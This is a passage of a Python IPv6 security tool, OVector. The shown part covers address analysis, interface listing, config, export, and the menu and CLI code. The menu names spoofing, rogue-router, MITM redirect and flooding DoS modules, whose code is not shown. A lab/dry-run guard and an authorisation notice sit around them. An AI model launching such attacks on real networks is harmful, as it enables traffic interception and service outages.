                log_info(f"{c(GR, '✓')}  {name}  — passed")
        except Exception as e:
            log_err(f"{name}: {e}")
            result.add_error(name, e)

    result.complete()
    print(SEP)
    if vuln_count:
        log_warn(f"Found  {c(RD+BD, str(vuln_count))}  potential vulnerabilities "
                 f"out of  {len(EXPLOIT_TESTS)}  checks.")
    else:
        log_info(f"All  {len(EXPLOIT_TESTS)}  checks passed — no issues found.")
    _history.record("exploit6", target, result.summary)
    return result


# ═══════════════════════════════════════════════════════════════════════════════
#  ┌─ MODULE: ADDRESS6
# ═══════════════════════════════════════════════════════════════════════════════

def run_address6() -> ScanResult:
    result = ScanResult("address6")
    log_sec("ADDRESS6  —  IPv6 Address Manipulation & Analysis")

    mac    = prompt("MAC address to convert    (skip = blank)")
    ipv6_i = prompt("IPv6 address to analyse   (skip = blank)")
    prefix = prompt("Prefix for EUI-64 gen     (skip = blank)")
    cidr   = prompt("CIDR network to analyse   (skip = blank)")

    print(SEP)

    # ── MAC → IPv6 ────────────────────────────────────────────────────────────
    if mac:
        try:
            mac   = mac.upper().replace('-', ':')
            ll    = IPv6Utils.mac_to_linklocal(mac)
            eui64 = IPv6Utils.mac_to_eui64(mac)
            vendor= IPv6Utils.mac_vendor(mac)
            log_sec("MAC Analysis")
            log_info(f"MAC            :  {c(CY,  mac)}")
            log_info(f"Vendor         :  {c(DM,  vendor or 'Unknown')}")
            log_info(f"EUI-64         :  {c(WH,  eui64)}")
            log_info(f"Link-local     :  {c(GR,  ll)}")
            if prefix:
                gen = IPv6Utils.mac_to_global(mac, prefix)
                log_info(f"Global ({prefix[:16]}):  {c(GR, gen)}")
            result.add_finding(Finding(
                name='MAC Converted', description=ll,
                severity=Severity.INFO, module='address6',
                evidence={'mac': mac, 'link_local': ll, 'eui64': eui64},
            ))
        except Exception as e:
            log_err(f"MAC conversion failed: {e}")

    # ── IPv6 deep analysis ────────────────────────────────────────────────────
    if ipv6_i:
        try:
            addr  = ipaddress.IPv6Address(ipv6_i)
            exp   = IPv6Utils.expand(str(addr))
            comp  = IPv6Utils.compress(str(addr))
            mc    = IPv6Utils.get_solicited_multicast(str(addr))
            mac_r = IPv6Utils.ipv6_to_mac(str(addr))
            cls   = IPv6Utils.classify(str(addr))
            log_sec("IPv6 Address Analysis")
            log_info(f"Input          :  {c(CY,  ipv6_i)}")
            log_info(f"Expanded       :  {c(WH,  exp)}")
            log_info(f"Compressed     :  {c(WH,  comp)}")
            log_info(f"Solicited MC   :  {c(WH,  mc)}")
            if mac_r:
                log_info(f"Derived MAC    :  {c(GR,  mac_r)}")
                log_info(f"Vendor         :  {c(DM,  IPv6Utils.mac_vendor(mac_r) or 'Unknown')}")
            log_sec("Address Properties")
            for prop, val in cls.items():
                col = GR if val else DM
                log_info(f"{prop.replace('_',' '):<20}:  {c(col, '✓' if val else '✗')}")
            result.add_finding(Finding(
                name='IPv6 Analysed', description=comp,
                severity=Severity.INFO, module='address6',
                evidence={'input': ipv6_i, 'expanded': exp, 'compressed': comp,
                           'solicited_mc': mc, 'properties': cls},
            ))
        except Exception as e:
            log_err(f"IPv6 parse failed: {e}")

    # ── Network / CIDR info ───────────────────────────────────────────────────
    if cidr:
        try:
            info = IPv6Utils.network_info(cidr)
            log_sec("Network Analysis")
            for k, v in info.items():
                log_info(f"{k.replace('_',' '):<20}:  {c(CY, str(v))}")
        except Exception as e:
            log_err(f"Network parse failed: {e}")

    result.complete()
    return result


# ═══════════════════════════════════════════════════════════════════════════════
#  ┌─ MODULE: INTERFACE-INFO
# ═══════════════════════════════════════════════════════════════════════════════

def run_interface_info() -> ScanResult:
    result = ScanResult("interface-info")
    log_sec("INTERFACE INFO  —  Network Interface Summary")

    ifaces = IPv6Utils.list_interfaces()
    if not ifaces:
        log_warn("No interfaces found.")
        result.complete()
        return result

    print()
    print(f"  {c(YL, 'Interface'):<20} {c(YL,'MAC'):<22} "
          f"{c(YL,'Link-local'):<44} {c(YL,'Global')}")
    print("  " + "─" * 110)

    for iface in ifaces:
        info = IPv6Utils.interface_summary(iface)
        ll   = info['link_local'][0] if info['link_local'] else c(DM, '—')
        gl   = info['global'][0]     if info['global']     else c(DM, '—')
        mac  = info['mac'] or c(DM, '—')
        print(f"  {c(CY, iface):<29} {c(WH, mac):<22} "
              f"{c(GR, ll):<53} {c(BL, gl)}")
        result.add_finding(Finding(
            name=f"Interface: {iface}",
            description=f"MAC={mac} LL={ll}",
            severity=Severity.INFO, module='interface-info',
            evidence=info,
        ))

    result.complete()
    return result


# ═══════════════════════════════════════════════════════════════════════════════
#  ┌─ MODULE: CONFIG EDITOR
# ═══════════════════════════════════════════════════════════════════════════════

def run_config() -> None:
    log_sec("CONFIGURATION")
    settings = _config.all_settings()

    for section, items in settings.items():
        print(f"\n  {c(CY+BD, '[' + section + ']')}")
        for k, v in items.items():
            print(f"    {c(WH, k):<30} = {c(GR, v)}")

    print()
    if confirm("Edit a setting?", False):
        valid_sections = list(settings.keys())
        log_dim(f"Sections: {', '.join(c(CY, s) for s in valid_sections)}")
        section = prompt("Section name").lower()
        if section not in valid_sections:
            log_err(f"Unknown section {section!r}. Valid: {', '.join(valid_sections)}")
            return
        valid_keys = list(settings[section].keys())
        log_dim(f"Keys in [{section}]: {', '.join(c(WH, k) for k in valid_keys)}")
        key = prompt("Setting name").lower()
        if key not in valid_keys:
            log_err(f"Unknown key {key!r} in [{section}].")
            return
        current = settings[section][key]
        log_dim(f"Current value: {c(GR, current)}")
        value = prompt(f"New value", current)
        if not value:
            log_warn("No value entered — unchanged.")
            return
        _config.set(section, key, value)
        _config.save()
        log_info(f"Saved: [{section}] {key} = {c(GR, value)}")


# ═══════════════════════════════════════════════════════════════════════════════
#  PRINT SUMMARY
# ═══════════════════════════════════════════════════════════════════════════════

def _print_summary(result: ScanResult):
    print(SEP)
    log_sec(f"SUMMARY — {result.module.upper()}")
    print(SEP)

    hosts = result.hosts
    finds = result.findings
    errs  = result.errors

    log_info(f"Module         :  {c(CY, result.module)}")
    log_info(f"Target         :  {c(CY, result.metadata.get('target', '—'))}")
    log_info(f"Interface      :  {c(CY, result.metadata.get('interface', '—'))}")
    log_info(f"Hosts found    :  {c(GR if hosts else DM, str(len(hosts)))}")
    log_info(f"Findings       :  {c(GR if finds else DM, str(len(finds)))}")
    log_info(f"Pkts sent      :  {c(WH, str(result.metadata['packets_sent']))}")
    log_info(f"Errors         :  {c(RD if errs else DM, str(len(errs)))}")
    if result.metadata.get('duration_s') is not None:
        log_info(f"Duration       :  {c(WH, str(result.metadata['duration_s']))} s")

    if finds:
        print(SEP_LIGHT)
        sev_counts: Dict[str, int] = defaultdict(int)
        for f in finds:
            sev_counts[f.severity.value] += 1
        for sev in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO']:
            if sev_counts[sev]:
                sv = Severity(sev)
                log_warn(f"{c(sv.color, sev):<30} {sev_counts[sev]}")

    if hosts:
        print(SEP_LIGHT)
        print(f"\n  {c(YL,'IPv6 Address'):<48} {c(YL,'MAC'):<22} "
              f"{c(YL,'RTT'):<12} {c(YL,'Hostname')}")
        print("  " + "─" * 100)
        for h in hosts:
            router_flag = c(OR, ' ⚑R') if h.is_router else ''
            vendor_str  = f" {c(DM,'('+h.vendor+')')}" if h.vendor else ''
            print(f"  {c(GR, h.ipv6):<57} {c(CY, h.mac or '—'):<22} "
                  f"{h.rtt:>7.2f} ms  "
                  f"{c(DM, h.hostname or '—')}{router_flag}{vendor_str}")
    print()


# ═══════════════════════════════════════════════════════════════════════════════
#  EXPORT MANAGER
# ═══════════════════════════════════════════════════════════════════════════════

def _export(result: Optional[ScanResult]):
    if not result:
        log_warn("No result to export. Run a module first.")
        return

    log_sec("EXPORT RESULT")
    print(SEP)

    # ── Choose output directory ───────────────────────────────────────────────
    default_dir = _config.get('general', 'output_dir',
                               str(Path.home() / 'ovector_results'))
    log_dim(f"Default output directory: {c(CY, default_dir)}")
    dir_input = prompt(f"Output directory  (Enter = default)").strip()
    if dir_input:
        out_dir = Path(dir_input).expanduser().resolve()
    else:
        out_dir = Path(default_dir)

    try:
        out_dir.mkdir(parents=True, exist_ok=True)
    except OSError as e:
        log_err(f"Cannot create directory {out_dir!r}: {e}")
        return

    log_info(f"Output directory: {c(CY, str(out_dir))}")

    # ── Choose format ─────────────────────────────────────────────────────────
    print(f"\n  {c(YL+BD,'  Format options:')}")
    print(f"    {c(CY,'[1]')} JSON   — machine-readable, full detail")
    print(f"    {c(CY,'[2]')} CSV    — spreadsheet-compatible")
    print(f"    {c(CY,'[3]')} HTML   — browser report with dark theme")
    print(f"    {c(CY,'[4]')} All    — export all three formats\n")
    fmt = prompt("Format  [1/2/3/4]")

    if fmt not in ('1', '2', '3', '4'):
        log_warn("No valid format selected — export cancelled.")
        return

    ts   = datetime.now().strftime("%Y%m%d_%H%M%S")
    name = f"{result.module}_{ts}"

    saved = []
    try:
        if fmt in ('1', '4'):
            fn = str(out_dir / f"{name}.json")
            result.to_json(fn)
            saved.append(fn)
        if fmt in ('2', '4'):
            fn = str(out_dir / f"{name}.csv")
            result.to_csv(fn)
            saved.append(fn)
        if fmt in ('3', '4'):
            fn = str(out_dir / f"{name}.html")
            result.to_html(fn)
            saved.append(fn)
    except OSError as e:
        log_err(f"Export failed: {e}")
        return

    print()
    for fn in saved:
        log_info(f"Saved  ➜  {c(CY, fn)}")

    if not saved:
        log_warn("Nothing exported.")


# ═══════════════════════════════════════════════════════════════════════════════
#  BANNER & HELP
# ═══════════════════════════════════════════════════════════════════════════════

def _build_banner() -> str:
    return f"""
{CY}
  ╔═╗ ╦  ╦╔═╗╔═╗╔╦╗╔═╗╦═╗
  ║ ║ ╚╗╔╝║╣ ║    ║ ║ ║╠╦╝
  ╚═╝  ╚╝ ╚═╝╚═╝  ╩ ╚═╝╩╚═
{R}
  {c(MG+BD, TOOL_NAME)}  {c(DM, '—  Advanced IPv6 Security Research Framework')}
  {c(DM, f'{DEV}  ·  {SITE}  ·  {YEAR}  ·  {VERSION}')}
  {c(DM, f'Log: {str(_session_log.log_path)}')}
"""


BANNER = property(_build_banner) if False else ""  # resolved at runtime via _get_banner()


def _get_banner() -> str:
    return f"""
{CY}
  ╔═╗ ╦  ╦╔═╗╔═╗╔╦╗╔═╗╦═╗
  ║ ║ ╚╗╔╝║╣ ║    ║ ║ ║╠╦╝
  ╚═╝  ╚╝ ╚═╝╚═╝  ╩ ╚═╝╩╚═
{R}
  {c(MG+BD, TOOL_NAME)}  {c(DM, '—  Advanced IPv6 Security Research Framework')}
  {c(DM, f'{DEV}  ·  {SITE}  ·  {YEAR}  ·  {VERSION}')}
  {c(DM, f'Log: {str(_session_log.log_path)}')}
"""


def _help_box() -> str:
    W = 72  # box inner width

    def _line(content: str = '') -> str:
        return f"{CY}║{R}  {content}\n"

    def _section(title: str, col: str = CY) -> str:
        label = f"  {c(col+BD, '┌──')} {c(col+BD, title)}"
        return f"{CY}║{R}{label}\n"

    def _row(num: str, name: str, desc: str, col: str = WH) -> str:
        num_s  = c(DM, f'[{num:>2}]')
        name_s = c(col+BD, f'{name:<18}')
        desc_s = c(DM, desc)
        return f"{CY}║{R}   {num_s} {name_s} {desc_s}\n"

    def _divider() -> str:
        return f"{CY}╠{'═' * W}╣{R}\n"

    def _empty() -> str:
        return f"{CY}║{' ' * W}║{R}\n"

    title_txt  = f"  {c(YL+BD, ' OVector')}{c(DM, ' — Module Reference & Quick Help')}  "
    header_pad = W - len(Color.strip(title_txt))

    box  = f"\n{CY}╔{'═' * W}╣{R}\n"
    box += f"{CY}║{R}{title_txt}{' ' * max(0, header_pad)}{CY}║{R}\n"
    box += _divider()
    box += _empty()

    # RECON
    box += _section("RECON", CY)
    box += _row( '1', 'alive6',         'Discover alive IPv6 hosts via ICMPv6 / NDP')
    box += _row( '2', 'dnsdict6',       'DNS AAAA record enumeration (brute-force)')
    box += _row( '3', 'detect-new-ip6', 'Real-time monitor for new IPv6 addresses')
    box += _row( '4', 'trace6',         'IPv6 traceroute  — TCP / UDP / ICMPv6')
    box += _empty()

    # ATTACK
    box += _section("ATTACK", OR)
    box += _row( '5', 'parasite6',      'NDP neighbour advertisement spoofing', OR)
    box += _row( '6', 'fake_router6',   'Rogue router advertisement injection',  OR)
    box += _row( '7', 'redir6',         'ICMPv6 redirect (MITM) attack',         OR)
    box += _empty()

    # DoS
    box += _section("DoS", RD)
    box += _row( '8', 'flood_router6',  'Flood network with random RA packets',  RD)
    box += _row( '9', 'smurf6',         'IPv6 smurf amplification DoS',          RD)
    box += _row('10', 'dos-new-ip6',    'Block new IPv6 hosts via DAD disruption',RD)
    box += _empty()

    # EXPLOIT
    box += _section("EXPLOIT", YL)
    box += _row('11', 'exploit6',       'IPv6 vuln assessment (RH0, NCE, DAD…)', YL)
    box += _empty()

    # UTILS
    box += _section("UTILS", GR)
    box += _row('12', 'address6',       'IPv6 / MAC address manipulation & analysis')
    box += _row('13', 'interface-info', 'Network interface summary with addresses')
    box += _empty()

    # Footer actions
    box += _divider()
    actions = (f"  {c(YL+BD,'[H]')} {c(DM,'Help')}   "
               f"{c(YL+BD,'[C]')} {c(DM,'Config')}   "
               f"{c(YL+BD,'[L]')} {c(DM,'History')}   "
               f"{c(YL+BD,'[E]')} {c(DM,'Export last result')}   "
               f"{c(RD+BD,'[0]')} {c(DM,'Exit')}")
    box += f"{CY}║{R}{actions}\n"
    box += f"{CY}╚{'═' * W}╝{R}"
    return box


MODULE_MAP: Dict[str, Tuple[str, Callable]] = {
    "1":  ("alive6",          run_alive6),
    "2":  ("dnsdict6",        run_dnsdict6),
    "3":  ("detect-new-ip6",  run_detect_new_ip6),
    "4":  ("trace6",          run_trace6),
    "5":  ("parasite6",       run_parasite6),
    "6":  ("fake_router6",    run_fake_router6),
    "7":  ("redir6",          run_redir6),
    "8":  ("flood_router6",   run_flood_router6),
    "9":  ("smurf6",          run_smurf6),
    "10": ("dos-new-ip6",     run_dos_new_ip6),
    "11": ("exploit6",        run_exploit6),
    "12": ("address6",        run_address6),
    "13": ("interface-info",  run_interface_info),
}


# ═══════════════════════════════════════════════════════════════════════════════
#  CLI ARGUMENT PARSER
# ═══════════════════════════════════════════════════════════════════════════════


def _offensive_guard(module_name: str) -> bool:
    """Return True if live offensive action may proceed; else simulate."""
    global OWL_DRY_RUN, OWL_LAB_MODE
    if module_name not in OFFENSIVE_MODULES:
        return True
    if OWL_DRY_RUN or not OWL_LAB_MODE:
        try:
            log_warn(f"[LAB/DRY-RUN] {module_name}: live packets suppressed. Pass --lab --no-dry-run for authorized lab use.")
        except Exception:
            print(f"[LAB/DRY-RUN] {module_name}: live packets suppressed.")
        return False
    return True

def build_argparser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="ovector",
        description=f"{TOOL_NAME} {VERSION} — Advanced IPv6 Security Research Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"  Developer : {DEV}\n  Website   : {SITE}\n\n"
               "  LEGAL: Use only on networks you own or have explicit written authorisation to test.",
    )
    p.add_argument('-m', '--module', choices=list(MODULE_MAP.keys()),
                   help='Run module directly (non-interactive)')
    p.add_argument('-i', '--iface',   metavar='IFACE',  help='Network interface')
    p.add_argument('-t', '--target',  metavar='TARGET', help='Target IPv6 / prefix')
    p.add_argument('-o', '--output-dir', metavar='DIR',
                   help='Directory to save exported results')
    p.add_argument('--no-root-check', action='store_true',
                   help='Skip root privilege check (not recommended)')
    p.add_argument('--version', action='version', version=f'{TOOL_NAME} {VERSION}')
    p.add_argument('--log-dir', metavar='DIR',
                   help=f'Log directory (default: {LOG_DIR})')
    p.add_argument('--dry-run', action='store_true', default=True,
                   help='Simulate offensive modules (default)')
    p.add_argument('--no-dry-run', action='store_true',
                   help='Allow live offensive modules (requires --lab)')
    p.add_argument('--lab', action='store_true',
                   help='Acknowledge authorized lab network use')
    p.add_argument('--self-test', action='store_true',
                   help='Run offline self-test and exit')
    return p


# ═══════════════════════════════════════════════════════════════════════════════
#  SIGNAL HANDLER
# ═══════════════════════════════════════════════════════════════════════════════

def _sigint_handler(sig, frame):
    print(f"\n\n  {c(YL,'[!]')} Interrupted — shutting down cleanly …")
    _session_log.warn("Session interrupted by user (SIGINT/SIGTERM)")
    sys.exit(0)


# ═══════════════════════════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════════════════════════

def main():
    global OWL_DRY_RUN, OWL_LAB_MODE
    signal.signal(signal.SIGINT, _sigint_handler)
    signal.signal(signal.SIGTERM, _sigint_handler)

    args = build_argparser().parse_args()
    if getattr(args, 'self_test', False):
        raise SystemExit(run_self_test())
    OWL_LAB_MODE = bool(getattr(args, 'lab', False))
    OWL_DRY_RUN = not bool(getattr(args, 'no_dry_run', False))
    if getattr(args, 'no_dry_run', False) and not OWL_LAB_MODE:
        log_warn('--no-dry-run ignored without --lab (keeping dry-run)')
        OWL_DRY_RUN = True

    if not args.no_root_check:
        require_root()

    # Apply CLI overrides to config
    if hasattr(args, 'output_dir') and args.output_dir:
        _config.set('general', 'output_dir', args.output_dir)

    if not SCAPY_OK:
        log_err("Scapy is required.  Run:  pip install scapy")
        sys.exit(1)

    check_dependencies()

    # Non-interactive direct module launch
    if args.module:
        _, fn = MODULE_MAP[args.module]
        try:
            result = fn()
            if result:
                _print_summary(result)
                if _config.getbool('general', 'auto_export'):
                    _export(result)
        except KeyboardInterrupt:
            log_warn("Interrupted.")
        sys.exit(0)

    # Interactive menu
    last_result: Optional[ScanResult] = None

    while True:
        os.system("clear")
        print(_get_banner())
        print(_help_box())

        choice = prompt("Select module").upper()

        if choice == "0":
            log_info("Goodbye.")
            sys.exit(0)

        elif choice == "H":
            os.system("clear")
            print(_get_banner())
            print(_help_box())
            input(f"\n  {c(DM,'Press Enter to continue …')}")

        elif choice == "E":
            _export(last_result)
            input(f"\n  {c(DM,'Press Enter to continue …')}")

        elif choice == "C":
            os.system("clear")
            print(_get_banner())
            run_config()
            input(f"\n  {c(DM,'Press Enter to continue …')}")

        elif choice == "L":
            os.system("clear")
            print(_get_banner())
            _history.show()
            input(f"\n  {c(DM,'Press Enter to continue …')}")

        elif choice in MODULE_MAP:
            os.system("clear")
            print(_get_banner())
            try:
                _, fn      = MODULE_MAP[choice]
                last_result = fn()
                if last_result:
                    _print_summary(last_result)
                    if _config.getbool('general', 'auto_export'):
                        _export(last_result)
                    else:
                        print()
                        if confirm("Export this result now?", False):
                            _export(last_result)
            except KeyboardInterrupt:
                log_warn("Module interrupted by user.")
            except RuntimeError as e:
                log_err(str(e))
            except Exception as e:
                log_err(f"Unexpected error in module: {e}")
                _session_log.error(traceback.format_exc())
            input(f"\n  {c(DM,'Press Enter to return to menu …')}")

        else:
            log_err(f"Unknown option: {choice!r}")
            time.sleep(0.8)


# === OWL TRACK-D SELF-TEST HOOK ===
def run_self_test() -> int:
    print("OVector Self-Test (offline / dry-run)")
    passed = failed = 0
    def check(name, cond):
        nonlocal passed, failed
        print(("  [ OK ] " if cond else "  [FAIL] ") + name)
        if cond: passed += 1
        else: failed += 1
    try:
        global OWL_DRY_RUN, OWL_LAB_MODE
        OWL_DRY_RUN, OWL_LAB_MODE = True, False
        check("offensive set non-empty", len(OFFENSIVE_MODULES) >= 5)
        check("guard blocks without lab", _offensive_guard("flood_router6") is False)
        check("recon not blocked", _offensive_guard("alive6") is True)
        OWL_LAB_MODE, OWL_DRY_RUN = True, False
        check("guard allows with lab+nodry", _offensive_guard("flood_router6") is True)
        OWL_DRY_RUN, OWL_LAB_MODE = True, False
        check("address utils present", callable(run_address6))
    except Exception as e:
        print("  [FAIL]", e); failed += 1
    print(("ALL PASS" if failed==0 else "FAILED") + ": %d ok, %d fail" % (passed, failed))
    return 0 if failed == 0 else 1


if __name__ == "__main__":
    main()
